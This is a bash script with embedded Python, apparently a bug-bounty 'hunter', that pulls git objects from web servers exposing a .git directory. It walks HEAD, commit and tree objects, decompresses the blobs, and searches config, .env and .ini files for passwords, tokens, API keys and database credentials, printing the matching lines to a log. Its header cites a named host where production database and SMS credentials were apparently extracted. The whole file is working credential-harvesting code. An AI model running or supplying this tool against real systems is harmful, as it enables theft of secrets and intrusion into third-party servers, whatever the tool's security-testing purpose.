#!/usr/bin/env bash
# hunt-git-deep.sh — .git 物件深層提取（git-exposure 延伸版）
# 來源：EVERY8D TP-S47 pattern
#   in-api.e8d.tw/.git 暴露 → HEAD → commit → tree → blob zlib decompress
#   提取 config.ini → production DB creds + SMS API creds
#
# 前提：.git/ 目錄已確認暴露（git-exposure hunter 命中後再跑此 hunter）
# 流程：HEAD → objects/xx/yy → zlib decompress → parse config/env/credentials
# 不依賴 git-dumper（純 HTTP + python3 zlib）
set -uo pipefail

HOST="${1:-}"
[ -z "$HOST" ] && { echo "Usage: $0 <https://host>"; exit 1; }
HOST="${HOST%/}"
SLUG=$(echo "$HOST" | sed 's|https\?://||;s|[/:]|_|g')
OUT_DIR="${OUT_DIR:-./git_deep_out}"
mkdir -p "$OUT_DIR"
OUT="$OUT_DIR/${SLUG}.txt"
: > "$OUT"
log(){ echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }
hit(){ echo "🔴 $*" | tee -a "$OUT"; }
warn(){ echo "🟡 $*" | tee -a "$OUT"; }

UA="Mozilla/5.0 (compatible; bbflow/git-deep)"

log "=== git-deep hunt: $HOST ==="

# Step 1: Confirm .git exposure
GIT_URL="${HOST}/.git/"
CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 6 "$GIT_URL" 2>/dev/null)
if [[ "$CODE" == "000" || "$CODE" == "404" ]]; then
  log "  .git/ not accessible (HTTP $CODE) — skip"
  exit 0
fi
log "  .git/ accessible [HTTP $CODE]"

# Step 2: Get HEAD commit hash
HEAD_CONTENT=$(curl -sk --max-time 8 "${HOST}/.git/HEAD" 2>/dev/null)
log "  HEAD: $HEAD_CONTENT"

COMMIT_HASH=""
if echo "$HEAD_CONTENT" | grep -q "ref:"; then
  REF=$(echo "$HEAD_CONTENT" | grep -o 'refs/heads/[^ ]*' | tr -d '\r\n')
  COMMIT_HASH=$(curl -sk --max-time 8 "${HOST}/.git/${REF}" 2>/dev/null | tr -d '\r\n')
else
  COMMIT_HASH=$(echo "$HEAD_CONTENT" | tr -d '\r\n ')
fi

if [ -z "$COMMIT_HASH" ] || [ "${#COMMIT_HASH}" -ne 40 ]; then
  warn "  could not extract valid commit hash from HEAD"
  # Try packed-refs fallback
  PACKED=$(curl -sk --max-time 8 "${HOST}/.git/packed-refs" 2>/dev/null)
  COMMIT_HASH=$(echo "$PACKED" | grep "refs/heads/main\|refs/heads/master\|refs/heads/prod" | awk '{print $1}' | head -1)
  [ "${#COMMIT_HASH}" -ne 40 ] && { log "  no valid commit hash — exit"; exit 0; }
fi
log "  HEAD commit: $COMMIT_HASH"

# Step 3: Extract git objects via zlib decompression
extract_object() {
  local HASH="$1"
  local OBJ_URL="${HOST}/.git/objects/${HASH:0:2}/${HASH:2}"
  python3 - "$OBJ_URL" "$UA" <<'PYEOF' 2>/dev/null
import sys, urllib.request, zlib
url, ua = sys.argv[1], sys.argv[2]
try:
    req = urllib.request.Request(url, headers={'User-Agent': ua})
    data = urllib.request.urlopen(req, timeout=10).read()
    raw = zlib.decompress(data)
    # Strip git object header (e.g., "blob 978\0")
    null_idx = raw.find(b'\x00')
    content = raw[null_idx+1:] if null_idx != -1 else raw
    sys.stdout.buffer.write(content)
except Exception as e:
    sys.stderr.write(f"error: {e}\n")
PYEOF
}

parse_tree_for_blobs() {
  local HASH="$1"
  # Parse binary tree object: mode SP filename NUL sha1(20bytes) ...
  python3 - "${HOST}/.git/objects/${HASH:0:2}/${HASH:2}" "$UA" <<'PYEOF' 2>/dev/null
import sys, urllib.request, zlib, struct, binascii
url, ua = sys.argv[1], sys.argv[2]
try:
    req = urllib.request.Request(url, headers={'User-Agent': ua})
    data = urllib.request.urlopen(req, timeout=10).read()
    raw = zlib.decompress(data)
    null_idx = raw.find(b'\x00')
    content = raw[null_idx+1:] if null_idx != -1 else raw
    i = 0
    while i < len(content):
        sp = content.find(b' ', i)
        if sp == -1: break
        nul = content.find(b'\x00', sp)
        if nul == -1: break
        mode = content[i:sp].decode('utf-8', errors='replace')
        name = content[sp+1:nul].decode('utf-8', errors='replace')
        sha1 = binascii.hexlify(content[nul+1:nul+21]).decode()
        print(f"{mode} {sha1} {name}")
        i = nul + 21
except Exception as e:
    sys.stderr.write(f"error: {e}\n")
PYEOF
}

# Extract commit → get tree hash
COMMIT_OBJ=$(extract_object "$COMMIT_HASH")
TREE_HASH=$(echo "$COMMIT_OBJ" | grep "^tree " | awk '{print $2}' | head -1)
if [ -z "$TREE_HASH" ] || [ "${#TREE_HASH}" -ne 40 ]; then
  warn "  could not extract tree from commit $COMMIT_HASH"
  exit 0
fi
log "  root tree: $TREE_HASH"

# Parse tree to find interesting files
TREE_ENTRIES=$(parse_tree_for_blobs "$TREE_HASH")
log "  tree entries: $(echo "$TREE_ENTRIES" | wc -l | tr -d ' ')"

# Target files containing credentials
CRED_PATTERNS=("config" "credential" ".env" "settings" "database" "password" "secret" ".ini" ".conf" ".cfg" "config_")

FOUND_CREDS=0
while IFS= read -r ENTRY; do
  MODE=$(echo "$ENTRY" | awk '{print $1}')
  BLOB_HASH=$(echo "$ENTRY" | awk '{print $2}')
  FNAME=$(echo "$ENTRY" | awk '{print $3}')

  # Check if filename matches credential patterns
  INTERESTING=0
  for PAT in "${CRED_PATTERNS[@]}"; do
    if echo "$FNAME" | grep -qi "$PAT"; then
      INTERESTING=1
      break
    fi
  done
  [ "$INTERESTING" = "0" ] && continue

  log "  extracting blob: $FNAME ($BLOB_HASH)"
  BLOB_CONTENT=$(extract_object "$BLOB_HASH")
  if [ -z "$BLOB_CONTENT" ]; then
    warn "  could not extract blob $BLOB_HASH ($FNAME)"
    continue
  fi

  # Check for credential patterns in content
  if echo "$BLOB_CONTENT" | grep -qiE "password|passwd|pwd|secret|token|api.?key|credential|mysql|mssql|database|smtp"; then
    hit "[P1-CRIT] git-deep: credentials found in $FNAME (blob $BLOB_HASH)"
    log "  file content preview:"
    echo "$BLOB_CONTENT" | grep -iE "password|passwd|pwd|secret|token|api.?key|mysql|mssql|smtp|user.*=|pass.*=|key.*=" | head -20 | while read -r LINE; do
      log "    $LINE"
    done
    FOUND_CREDS=1
  fi
done <<< "$TREE_ENTRIES"

# Also try sub-trees if root tree had no direct blob hits
if [ "$FOUND_CREDS" = "0" ]; then
  log "  no creds in root tree — checking sub-directories"
  while IFS= read -r ENTRY; do
    MODE=$(echo "$ENTRY" | awk '{print $1}')
    BLOB_HASH=$(echo "$ENTRY" | awk '{print $2}')
    FNAME=$(echo "$ENTRY" | awk '{print $3}')
    [[ "$MODE" != "40000" ]] && continue
    log "  scanning sub-tree: $FNAME ($BLOB_HASH)"
    SUB_ENTRIES=$(parse_tree_for_blobs "$BLOB_HASH")
    while IFS= read -r SENTRY; do
      SBLOB=$(echo "$SENTRY" | awk '{print $2}')
      SFNAME=$(echo "$SENTRY" | awk '{print $3}')
      for PAT in "${CRED_PATTERNS[@]}"; do
        if echo "$SFNAME" | grep -qi "$PAT"; then
          SCONTENT=$(extract_object "$SBLOB")
          if echo "$SCONTENT" | grep -qiE "password|passwd|pwd|secret|token|api.?key|mysql|mssql|database"; then
            hit "[P1-CRIT] git-deep: credentials found in $FNAME/$SFNAME (blob $SBLOB)"
            echo "$SCONTENT" | grep -iE "password|passwd|pwd|secret|token|api.?key|mysql|mssql|user.*=|pass.*=|key.*=" | head -10 | while read -r LINE; do log "    $LINE"; done
          fi
          break
        fi
      done
    done <<< "$SUB_ENTRIES"
  done <<< "$TREE_ENTRIES"
fi

log "=== done → $OUT ==="
